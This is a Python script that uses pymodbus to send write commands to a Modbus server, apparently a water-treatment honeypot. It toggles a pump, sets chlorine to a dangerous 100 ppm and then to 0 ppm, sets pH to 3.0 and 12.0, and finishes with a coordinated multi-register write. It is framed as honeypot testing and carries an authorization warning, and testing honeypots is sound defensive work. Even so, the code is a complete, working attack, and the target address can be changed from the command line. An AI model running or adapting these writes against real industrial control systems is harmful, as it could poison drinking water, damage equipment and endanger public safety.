#!/usr/bin/env python3
"""
Modbus Attack Script - Simulate Attacks
Writes to process variables to simulate malicious attacks
"""

from pymodbus.client import ModbusTcpClient
import sys
import time

# Configuration
HONEYPOT_IP = '192.168.244.138'  # Change to your Windows host IP where Docker is running
HONEYPOT_PORT = 502

def attack_pump():
    """Attack 1: Turn pump on/off"""
    client = ModbusTcpClient(HONEYPOT_IP, port=HONEYPOT_PORT)
    client.connect()
    
    print("\n[!] ATTACK 1: Pump Control Manipulation")
    print("-" * 60)
    
    # Turn pump ON
    print("[!] Writing to PUMP_STATUS (register 40003) - Turning ON")
    result = client.write_register(2, 1, unit=1)
    if not result.isError():
        print("[+] SUCCESS: Pump turned ON")
        time.sleep(2)
    else:
        print(f"[-] FAILED: {result}")
    
    # Turn pump OFF
    print("[!] Writing to PUMP_STATUS (register 40003) - Turning OFF")
    result = client.write_register(2, 0, unit=1)
    if not result.isError():
        print("[+] SUCCESS: Pump turned OFF")
    else:
        print(f"[-] FAILED: {result}")
    
    client.close()

def attack_chlorine():
    """Attack 2: Manipulate chlorine levels"""
    client = ModbusTcpClient(HONEYPOT_IP, port=HONEYPOT_PORT)
    client.connect()
    
    print("\n[!] ATTACK 2: Chlorine Level Manipulation")
    print("-" * 60)
    
    # Set dangerous chlorine level (100 ppm = 1000 in register)
    print("[!] Writing to CHLORINE_PPM (register 40001) - Setting to 100 ppm (DANGEROUS!)")
    result = client.write_register(0, 1000, unit=1)
    if not result.isError():
        print("[+] SUCCESS: Chlorine level set to 100.0 ppm")
        time.sleep(2)
    else:
        print(f"[-] FAILED: {result}")
    
    # Set to zero (also dangerous - no disinfection)
    print("[!] Writing to CHLORINE_PPM (register 40001) - Setting to 0 ppm")
    result = client.write_register(0, 0, unit=1)
    if not result.isError():
        print("[+] SUCCESS: Chlorine level set to 0.0 ppm")
    else:
        print(f"[-] FAILED: {result}")
    
    client.close()

def attack_ph():
    """Attack 3: Manipulate pH levels"""
    client = ModbusTcpClient(HONEYPOT_IP, port=HONEYPOT_PORT)
    client.connect()
    
    print("\n[!] ATTACK 3: pH Level Manipulation")
    print("-" * 60)
    
    # Set extreme acidic pH (3.0 = 300 in register)
    print("[!] Writing to PH_LEVEL (register 40002) - Setting to 3.0 (EXTREME ACIDIC!)")
    result = client.write_register(1, 300, unit=1)
    if not result.isError():
        print("[+] SUCCESS: pH level set to 3.0")
        time.sleep(2)
    else:
        print(f"[-] FAILED: {result}")
    
    # Set extreme basic pH (12.0 = 1200 in register)
    print("[!] Writing to PH_LEVEL (register 40002) - Setting to 12.0 (EXTREME BASIC!)")
    result = client.write_register(1, 1200, unit=1)
    if not result.isError():
        print("[+] SUCCESS: pH level set to 12.0")
    else:
        print(f"[-] FAILED: {result}")
    
    client.close()

def attack_multiple():
    """Attack 4: Coordinated multi-register attack"""
    client = ModbusTcpClient(HONEYPOT_IP, port=HONEYPOT_PORT)
    client.connect()
    
    print("\n[!] ATTACK 4: Coordinated Multi-Register Attack")
    print("-" * 60)
    
    attacks = [
        (0, 500, "CHLORINE_PPM", "Setting chlorine to 50.0 ppm"),
        (1, 400, "PH_LEVEL", "Setting pH to 4.0"),
        (2, 1, "PUMP_STATUS", "Turning pump ON"),
        (3, 100, "WATER_LEVEL", "Setting water level to 100 cm"),
    ]
    
    for addr, value, name, desc in attacks:
        print(f"[!] {desc}")
        result = client.write_register(addr, value, unit=1)
        if not result.isError():
            print(f"[+] SUCCESS: {name} modified")
        else:
            print(f"[-] FAILED: {name} - {result}")
        time.sleep(1)
    
    client.close()

def main():
    """Run all attack scenarios"""
    print("=" * 60)
    print("MODBUS ATTACK SIMULATION")
    print(f"Target: {HONEYPOT_IP}:{HONEYPOT_PORT}")
    print("=" * 60)
    print("\n⚠️  WARNING: This script simulates malicious attacks!")
    print("⚠️  Only use on authorized systems!")
    print("\nPress Ctrl+C to cancel, or Enter to continue...")
    
    try:
        input()
    except KeyboardInterrupt:
        print("\n[!] Cancelled")
        return
    
    # Run attacks
    try:
        attack_pump()
        time.sleep(2)
        attack_chlorine()
        time.sleep(2)
        attack_ph()
        time.sleep(2)
        attack_multiple()
        
        print("\n" + "=" * 60)
        print("[+] All attacks completed!")
        print("[+] Check honeypot logs to see the attacks")
        print("[+] View in Kibana: http://{}:5601".format(HONEYPOT_IP))
        print("=" * 60)
        
    except Exception as e:
        print(f"\n[-] Error during attack: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        HONEYPOT_IP = sys.argv[1]
    if len(sys.argv) > 2:
        HONEYPOT_PORT = int(sys.argv[2])
    
    main()

